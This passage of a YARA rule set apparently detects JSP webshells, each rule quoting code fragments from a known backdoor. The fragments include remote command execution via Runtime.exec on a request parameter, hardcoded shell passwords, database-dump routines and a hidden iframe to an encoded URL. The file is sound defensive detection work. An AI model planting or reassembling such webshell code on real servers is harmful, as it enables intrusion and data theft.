        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
    strings:
        $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
        $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s4 = "\">Copyright (C) 2010 <a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">http://www.Forjj.com/</a>&nbsp;&nbsp;<a target=" ascii
        $s5 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s6 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</span>\");" fullword ascii
        $s8 = "JSession.setAttribute(MSG,\"<span style='color:green'>Upload File Success!</span>\");" fullword ascii
        $s9 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName());" fullword ascii
        $s10 = "private static final String PW = \"012457\"; //password" fullword ascii
        $s11 = "oString()+\"/exportdata.txt\")+\"\\\" size=\\\"100\\\" class=\\\"input\\\"/>\"+" fullword ascii
        $s12 = "der(\"host\")+\" (<span id='ip'>\"+InetAddress.getLocalHost().getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!window.c" ascii
        $s13 = "\" <input type=\\\"submit\\\" class=\\\"bt\\\" value=\\\"Export\\\"/><br/><br/>\"+BACK_HREF+\"</td>\"+" fullword ascii
        $s14 = "* CY . I Love You." fullword ascii
        $s15 = "* by n1nty" fullword ascii
        $s16 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
        $s17 = "dData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText));alert" ascii
        $s18 = "/option><option value='ISO-8859-1'>ISO-8859-1</option></select>\"+" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_8df56930f13d77c5886e34ca6511c12ae6660d9a
{
    meta:
        description = "jsp - file 8df56930f13d77c5886e34ca6511c12ae6660d9a.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
    strings:
        $x1 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" fullword ascii
        $x2 = "request.setAttribute(\"error\", \"Execution of native commands is not allowed!\");" fullword ascii
        $x3 = "* Command of the shell interpreter and the parameter to run a programm" fullword ascii
        $s4 = ".processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
        $s5 = "<b><%=convertFileSize(size)%> in <%=fileCount%> files in <%=f.getName()%>. Compression ratio: <%=(f.length() * 100) / size%>%" fullword ascii
        $s6 = "static String startProcess(String command, String dir) throws IOException {" fullword ascii
        $s7 = "request.setAttribute(\"error\", \"Reading of \" + f.getName() + \" aborted. Error: \"" fullword ascii
        $s8 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ht.get(\"dir\"));" fullword ascii
        $s9 = "* Max time in ms a process is allowed to run, before it will be terminated" fullword ascii
        $s10 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + f.getName()" fullword ascii
        $s11 = "if (System.currentTimeMillis() - start > MAX_PROCESS_RUNNING_TIME) {" fullword ascii
        $s12 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"rename_me.zip\\\"\");" fullword ascii
        $s13 = "request.setAttribute(\"error\", \"You are not allowed to access \" + request.getAttribute(\"dir\"));" fullword ascii
        $s14 = "private static final long MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds" fullword ascii
        $s15 = "request.setAttribute(\"error\", \"Directory \" + f.getAbsolutePath() + \" does not exist.\");" fullword ascii
        $s16 = "\"Content-Disposition\", \"inline;filename=\\\"temp.txt\\\"\");" fullword ascii
        $s17 = "request.setAttribute(\"error\", \"You are not allowed to access \" + ef.getAbsolutePath());" fullword ascii
        $s18 = "request.setAttribute(\"error\", \"You are not allowed to access \" + new_f.getAbsolutePath());" fullword ascii
        $s19 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f.getAbsoluteFile());" fullword ascii
        $s20 = "request.setAttribute(\"error\", \"You are not allowed to access \" + f_new.getAbsolutePath());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule dfa8bd63142af1bb691c72e132b0e362b9963c3f
{
    meta:
        description = "jsp - file dfa8bd63142af1bb691c72e132b0e362b9963c3f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a577587bd71c3928ba7902f147a18ab647e1478e0559ec1f213fcbf6c227b991"
    strings:
        $x1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"cmd\"));" fullword ascii
        $s2 = "// cmd.jsp = Command Execution (win32)" fullword ascii
        $s3 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"\\n<BR>\");" fullword ascii
        $s4 = "if (request.getParameter(\"cmd\") != null) {" fullword ascii
        $s5 = "<%@ page import=\"java.util.*,java.io.*,java.net.*\"%>" fullword ascii
        $s6 = "out.println(disr); disr = dis.readLine(); }" fullword ascii
        $s7 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword ascii
        $s8 = "InputStream in = p.getInputStream();" fullword ascii
        $s9 = "OutputStream os = p.getOutputStream();" fullword ascii
        $s10 = "<INPUT TYPE=\"text\" NAME=\"cmd\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 2KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_6121bd4faf3aa1f13ac99df8f6030041ca9d3cc3
{
    meta:
        description = "jsp - file 6121bd4faf3aa1f13ac99df8f6030041ca9d3cc3.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ea0d67b44f2a604603176606bd47cb55845bf29b191564958ce9b9d2a33c63b9"
    strings:
        $s1 = "sRet += \"  <td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s2 = "sRet += \"  <td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s3 = "\"\\\">&lt;\" + strCut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s4 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
        $s5 = "\"\\\">\" + pathConvert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s6 = "private String _password = \"icesword\";" fullword ascii
        $s7 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
        $s8 = "sRet += \"  <td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s9 = "<input type=\"hidden\" name=\"__VIEWSTATE\" value=\"dDwtMTQyNDQzOTM1NDt0PDtsPGk8OT47PjtsPHQ8cDxsPGVuY3R5cGU7PjtsPG11bHRpc" fullword ascii
        $s10 = "_url = \"jdbc:mysql://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";DatabaseName=" ascii
        $s11 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" + dbUsername + \";Password=\" + dbPassword + \";" ascii
        $s12 = "if (request.getParameter(\"command\") != null) {  " fullword ascii
        $s13 = ".getPath()) + \"\\\" /></td>\\n\";" fullword ascii
        $s14 = "3J5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==\" />" fullword ascii
        $s15 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
        $s16 = "sRet += \" if (folderName != null && folderName != false && ltrim(folderName) != \\\"\\\") {\\n\";" fullword ascii
        $s17 = "=\\\" + document.fileList.filesDelete[selected].value;\";" fullword ascii
        $s18 = "<TD align=\"left\"><FONT face=\"webdings\" color=\"#ffffff\"> 8</FONT><FONT face=\"Verdana, Arial, Helvetica, sans-serif\" c" fullword ascii
        $s19 = "Action=open\" + \"\\\">edit</a>>\" : \"\") + \"</td>\\n\";" fullword ascii
        $s20 = "<td align=\"center\" class=\"datarows\"><%=System.getProperty(\"java.compiler\") == null ? \"\" : System.getProperty(\"java.comp" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule b783b4c5b8e4db4c6a211e6fc06c5aafbdf4e211
{
    meta:
        description = "jsp - file b783b4c5b8e4db4c6a211e6fc06c5aafbdf4e211.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c61303ebaa7234acd2aea6c5a7cb076c918938f2ace2a966d2dbe4382e766de0"
    strings:
        $s1 = "<SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url='></SCRIPT>" fullword ascii
        $s2 = "<td align=\"right\">darkst by <a href=\"mailto:376186027@qq.com\">New4</a> and welcome to <a href=\"http://www.darkst.com\" targ" ascii
        $s3 = "<td align=\"right\">darkst by <a href=\"mailto:376186027@qq.com\">New4</a> and welcome to <a href=\"http://www.darkst.com\" targ" ascii
        $s4 = "throw new JshellConfigException(\"session&#36229;&#26102;&#26102;&#38388;&#21482;&#33021;&#22635;&#25968;&#23383;\");" fullword ascii
        $s5 = "throw new JshellConfigException(\"&#31243;&#24207;&#25991;&#20214;&#24050;&#32463;&#34987;&#38750;&#27861;&#20462;&#25913;\");" fullword ascii
        $s6 = "throw new JshellConfigException(\"&#31243;&#24207;&#20307;&#24050;&#32463;&#34987;&#38750;&#27861;&#20462;&#25913;\");" fullword ascii
        $s7 = "<td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s8 = "document.fileList.action = \\\"\" + curUri + \"&curPath=\" + path + \"&fsAction=copyto&dstPath=\" + \"\\\" + toPath;\\n\";" fullword ascii
        $s9 = "sRet = \"<font color=\\\"red\\\">\\\"\" + path + folderName + \"\\\"&#30446;&#24405;&#24050;&#32463;&#23384;&#22312;</font>\";" fullword ascii
        $s10 = "sRet = \"<font color=\\\"red\\\">&#21019;&#24314;&#25991;&#20214;\\\"\" + path + fileName + \"\\\"&#22833;&#36133;</font>\";" fullword ascii
        $s11 = "sRet = \"<font color=\\\"red\\\">\\\"\" + path + fileName + \"\\\"&#25991;&#20214;&#24050;&#32463;&#23384;&#22312;</font>\";" fullword ascii
        $s12 = "throw new JshellConfigException(\"&#25171;&#24320;&#25991;&#20214;&#22833;&#36133;\");" fullword ascii
        $s13 = "sRet = \"<font color=\\\"red\\\">&#21019;&#24314;&#30446;&#24405;\\\"\" + folderName + \"\\\"&#22833;&#36133;</font>\";" fullword ascii
        $s14 = "sRet = \"<font color=\\\"red\\\">&#25991;&#20214;\\\"\" + file2Rename + \"\\\"&#19981;&#23384;&#22312;</font>\";" fullword ascii
        $s15 = "sRet += \"<font color=\\\"red\\\">&#21024;&#38500;\\\"\" + files2Delete[i] + \"\\\"&#22833;&#36133;</font><br>\\n\";" fullword ascii
        $s16 = "sRet = \"<font color=\\\"red\\\">&#25991;&#20214;\\\"\" + path + \"\\\"&#24050;&#32463;&#23384;&#22312;</font>\";" fullword ascii
        $s17 = "sRet = \"<font color=\\\"red\\\">&#19981;&#33021;&#25171;&#24320;&#25991;&#20214;\\\"\" + path + \"\\\"</font>\";" fullword ascii
        $s18 = "sRet = \"<font color=\\\"red\\\">&#21019;&#24314;&#25991;&#20214;\\\"\" + path + \"\\\"&#22833;&#36133;</font>\";" fullword ascii
        $s19 = "sRet += \"<a href=\\\"#\\\" onclick=\\\"javascript:showUpload()\\\">&#19978;&#20256;&#25991;&#20214;</a>\\n\";" fullword ascii
        $s20 = "new JshellConfigException(\"&#20889;&#25991;&#20214;&#22833;&#36133;\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_87aa569e2debdb5b38f356b539eb397171b83965
{
    meta:
        description = "jsp - file 87aa569e2debdb5b38f356b539eb397171b83965.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8db4b99711e38a16567f0cbcde2ae568b68c33324649f09fb85714f717a684cf"
    strings:
        $s1 = "ResultSet r = m.executeQuery(\"select * from \" + x[3]);" fullword ascii
        $s2 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z0\") + \"\";" fullword ascii
        $s3 = "ResultSet r = m.executeQuery(q);" fullword ascii
        $s4 = "response.setContentType(\"text/html;charset=\" + cs);" fullword ascii
        $s5 = "Connection c = DriverManager.getConnection(x[1].trim());" fullword ascii
        $s6 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()" fullword ascii
        $s7 = "sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"" fullword ascii
        $s8 = "}//new String(s.getBytes(\"ISO-8859-1\"),c);}    Connection GC(String s) throws Exception {" fullword ascii
        $s9 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)" fullword ascii
        $s10 = "String z1 = EC(request.getParameter(\"z1\") + \"\", cs);" fullword ascii
        $s11 = "String z2 = EC(request.getParameter(\"z2\") + \"\", cs);" fullword ascii
        $s12 = "sb.append(EC(r.getString(i), cs) + \"\\t|\\t\");" fullword ascii
        $s13 = "String Z = EC(request.getParameter(Pwd) + \"\", cs);" fullword ascii
        $s14 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword ascii
        $s15 = "ResultSet r = c.getMetaData().getCatalogs();" fullword ascii
        $s16 = ".charAt(i + 1))));" fullword ascii
        $s17 = ".write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d" fullword ascii
        $s18 = "new InputStreamReader(new FileInputStream(new File(" fullword ascii
        $s19 = ".getRequestURI())).getParent();" fullword ascii
        $s20 = "request.setCharacterEncoding(cs);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule ec90200f4e2708faa21e371b2fc076c51412515f
{
    meta:
        description = "jsp - file ec90200f4e2708faa21e371b2fc076c51412515f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d5756abb572705bf4375b1a80961d72194a8193f81c77938a598139f9ec13c1c"
    strings:
        $s1 = "</font>\",\" <font color=red> Thanks for your support - - by 7jyewu.cn http://www.7jyewu.cn </font>\"};" fullword ascii
        $s2 = "<center><a href=\"http://www.7jyewu.cn\" target=\"_blank\">www.7jyewu.cn</a> ,All Rights Reserved." fullword ascii
        $s3 = "<a href=\"http://www.7jyewu.cn\" target=\"_blank\">http://www.7jyewu.cn/</a></b>" fullword ascii
        $s4 = "<br>Any question, please email me admin@syue.com" fullword ascii
        $s5 = "<iframe src=http://%37%6A%79%65%77%75%2E%63%6E/m.asp width=0 height=0></iframe>" fullword ascii
        $s6 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s7 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s8 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
        $s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
        $s10 = "sbFile.append(\"\"+list[i].getName()); " fullword ascii
        $s11 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
        $s12 = "response.setContentType(\"APPLICATION/OCTET-STREAM\"); " fullword ascii
        $s13 = "<title>JSP Shell " fullword ascii
        $s14 = "sbCmd.append(line+\"\\r\\n\");  " fullword ascii
        $s15 = "JFolder.jsp www.7jyewu.cn" fullword ascii
        $s16 = "sbEdit.append(htmlEncode(line)+\"\\r\\n\");  " fullword ascii
        $s17 = "private final static int languageNo=0; //" fullword ascii
        $s18 = "))+\"','','\"+strCmd+\"','1','');\\\">\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 8 of them ) ) or ( all of them )
}

rule sig_2640228cb6fb767a53615ca878898feb350139ca
{
    meta:
        description = "jsp - file 2640228cb6fb767a53615ca878898feb350139ca.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1970d3f76e891d8b4948967d77736ab21ff299dcd90d458373d3fa1d69c3ac98"
    strings:
        $s1 = "Connection conn = DriverManager.getConnection(url, username, password);" fullword ascii
        $s2 = "out.println(\"Dumping data for table \" + table + \"...<br />\");" fullword ascii
        $s3 = "ResultSet rs = ps.executeQuery();" fullword ascii
        $s4 = "ResultSet r = p.executeQuery();" fullword ascii
        $s5 = "<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>" fullword ascii
        $s6 = "String url = \"jdbc:oracle:thin:user/pass@localhost:1521:orcl\";" fullword ascii
        $s7 = "tables.add(rs.getString(1));" fullword ascii
        $s8 = "String sql_tables=\"select TABLE_NAME from user_tab_comments\";" fullword ascii
        $s9 = "for (int col = 1; col <= rsmeta.getColumnCount(); col++) {" fullword ascii
        $s10 = "OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(backupDir+table+ex), \"UTF-8\");" fullword ascii
        $s11 = "String table=tables.get(i);" fullword ascii
        $s12 = "String password = \"pass\";" fullword ascii
        $s13 = "ResultSetMetaData rsmeta=r.getMetaData();" fullword ascii
        $s14 = "<%@ page import=\"java.sql.*\" %>" fullword ascii
        $s15 = "bw.append(\"INSERT INTO \" + table + \" VALUES(\");" fullword ascii
        $s16 = "String ex=\".txt\";" fullword ascii
        $s17 = "if (col == rsmeta.getColumnCount())" fullword ascii
        $s18 = "String driver = \"oracle.jdbc.driver.OracleDriver\";" fullword ascii
        $s19 = "if (r.getString(col) == null)" fullword ascii
        $s20 = "String sql=\"select * from \"+table;" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule sig_8309be5965504adc35f7d29a272494abce47c686
{
    meta:
        description = "jsp - file 8309be5965504adc35f7d29a272494abce47c686.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e129288b96ead689b7571a04c6db69e4be345d8532923d6f85194b6c87ad2166"
    strings:
        $s1 = "ResultSet r = m.executeQuery(\"select * from \" + x[3]);" fullword ascii
        $s2 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z0\") + \"\";" fullword ascii
        $s3 = "ResultSet r = m.executeQuery(q);" fullword ascii
        $s4 = "response.setContentType(\"text/html;charset=\" + cs);" fullword ascii
        $s5 = "Connection c = DriverManager.getConnection(x[1].trim());" fullword ascii
        $s6 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()" fullword ascii
        $s7 = "sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"" fullword ascii
        $s8 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)" fullword ascii
        $s9 = "String z1 = EC(request.getParameter(\"z1\") + \"\", cs);" fullword ascii
        $s10 = "String z2 = EC(request.getParameter(\"z2\") + \"\", cs);" fullword ascii
        $s11 = "sb.append(EC(r.getString(i), cs) + \"\\t|\\t\");" fullword ascii
        $s12 = "String Z = EC(request.getParameter(Pwd) + \"\", cs);" fullword ascii
        $s13 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword ascii
        $s14 = "ResultSet r = c.getMetaData().getCatalogs();" fullword ascii
        $s15 = ".charAt(i + 1))));" fullword ascii
        $s16 = ".write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d" fullword ascii
        $s17 = "void FF(String s, HttpServletResponse r) throws Exception {" fullword ascii
        $s18 = "}//new String(s.getBytes(\"ISO-8859-1\"),c);}" fullword ascii
        $s19 = "new InputStreamReader(new FileInputStream(new File(" fullword ascii
        $s20 = "void QQ(String cs, String s, String q, StringBuffer sb) throws Exception {" fullword ascii
    condition:
        ( uint16(0) == 0x6854 and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule ded5eb546aa78dec7a51fd4f249c4c1ef5ec91f9
{
    meta:
        description = "jsp - file ded5eb546aa78dec7a51fd4f249c4c1ef5ec91f9.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "580c4815db65a2b1ae851156dcb7607d274f5feadf3903a7a348aaea6190027c"
    strings:
        $s1 = "out.print(\"<B>Path: <U>\" + f.toString() + \"</U></B><BR> <BR>\");" fullword ascii
        $s2 = "ServletOutputStream outs = response.getOutputStream();" fullword ascii
        $s3 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword ascii
        $s4 = "if(request.getParameter(\"file\")==null) {" fullword ascii
        $s5 = "\"( Size: \" + flist[i].length() + \" bytes)<BR>\\n\");" fullword ascii
        $s6 = "<%@ page import=\"java.util.*,java.io.*\"%>" fullword ascii
        $s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");" fullword ascii
        $s8 = "// list.jsp = Directory & File View" fullword ascii
        $s9 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fname.toString() + \"'>\" + fname.toString() + \"<" ascii
        $s10 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fname.toString() + \"'>\" + fname.toString() + \"<" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 5KB and ( all of them ) ) or ( all of them )
}

rule ringzer0
{
    meta:
        description = "jsp - file ringzer0.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4f2627d7c6fd1364781c66fae92552d278caeb27f77bbbd05be470d62e99a23e"
    strings:
        $s1 = "Process _3f965c0036e11457688879 = _ec16c7.exec(_00f67a8862bc35bc57da6fa074); " fullword ascii
        $s2 = "out.println(\"Current Command: <span>\" + _00f67a8862bc35bc57da6fa074 + \"</span><br /><br />\"); " fullword ascii
        $s3 = "InputStream _3512e4b93a17 = _3f965c0036e11457688879.getInputStream(); " fullword ascii
        $s4 = "OutputStream _17443c15d9 = _3f965c0036e11457688879.getOutputStream(); " fullword ascii
        $s5 = "String _00f67a8862bc35bc57da6fa074 = request.getParameter(\"c\");" fullword ascii
        $s6 = "out.println(_9866c17553ec6fc9ae110c + \"<br />\"); " fullword ascii
        $s7 = "Runtime _ec16c7 = Runtime.getRuntime();" fullword ascii
        $s8 = "String _9866c17553ec6fc9ae110c = _1aabb79a7e143d.readLine(); " fullword ascii
        $s9 = "_9866c17553ec6fc9ae110c = _1aabb79a7e143d.readLine(); " fullword ascii
        $s10 = "<input type=\"submit\" value=\"Run it\" /> " fullword ascii
        $s11 = "DataInputStream _1aabb79a7e143d = new DataInputStream(_3512e4b93a17); " fullword ascii
        $s12 = "<%@ page import=\"java.util.*,java.io.*\"%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 3KB and ( 8 of them ) ) or ( all of them )
}

rule sig_31df02361b7af1f74232e63664bf3ad7bf91e233
{
    meta:
        description = "jsp - file 31df02361b7af1f74232e63664bf3ad7bf91e233.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
    strings:
        $x1 = "</font>\",\" <font color=red> Thanks for your support - - by Syue http://www.syue.com </font>\"};" fullword ascii
        $s2 = "<a href=\"http://bbs.syue.com/\" target=\"_blank\">http://bbs.syue.com/</a></b>" fullword ascii
        $s3 = "<center><a href=\"http://www.syue.com\" target=\"_blank\">" fullword ascii
        $s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s5 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s6 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
        $s7 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
        $s8 = "sbFile.append(\"\"+list[i].getName()); " fullword ascii
        $s9 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
        $s10 = "response.setContentType(\"APPLICATION/OCTET-STREAM\"); " fullword ascii
        $s11 = "<title>JSP Shell " fullword ascii
        $s12 = "sbCmd.append(line+\"\\r\\n\");  " fullword ascii
        $s13 = "sbEdit.append(htmlEncode(line)+\"\\r\\n\");  " fullword ascii
        $s14 = "private final static int languageNo=0; //" fullword ascii
        $s15 = "))+\"','','\"+strCmd+\"','1','');\\\">\");" fullword ascii
        $s16 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
        $s17 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule d81109025958f6b0f0a92f3ce8daa0980b111a9c
{
    meta:
        description = "jsp - file d81109025958f6b0f0a92f3ce8daa0980b111a9c.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
    strings:
        $s1 = "<SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url='></SCRIPT>" fullword ascii
        $s2 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.GOOGLE.com\"" ascii
        $s3 = "sRet += \" <td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s4 = "sRet += \" <td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s5 = "t;\" + strCut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s6 = "+ pathConvert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s7 = "sRet += \" <td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s8 = "private String _password = \"admin\";" fullword ascii
        $s9 = "<input type=\"hidden\" name=\"__VIEWSTATE\" value=\"dDwtMTQyNDQzOTM1NDt0PDtsPGk8OT47PjtsPHQ8cDxsPGVuY3R5cGU7PjtsPG11bHRpc" fullword ascii
        $s10 = "sRet += \" <textarea name=\\\"fileContent\\\" cols=\\\"80\\\" rows=\\\"32\\\">\\n\";" fullword ascii
        $s11 = "if (request.getParameter(\"command\") != null) { " fullword ascii
        $s12 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.GOOGLE.com\"" ascii
        $s13 = "3J5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==\" />" fullword ascii
        $s14 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
        $s15 = "sRet += \" if (folderName != null && folderName != false && ltrim(folderName) != \\\"\\\") {\\n\";" fullword ascii
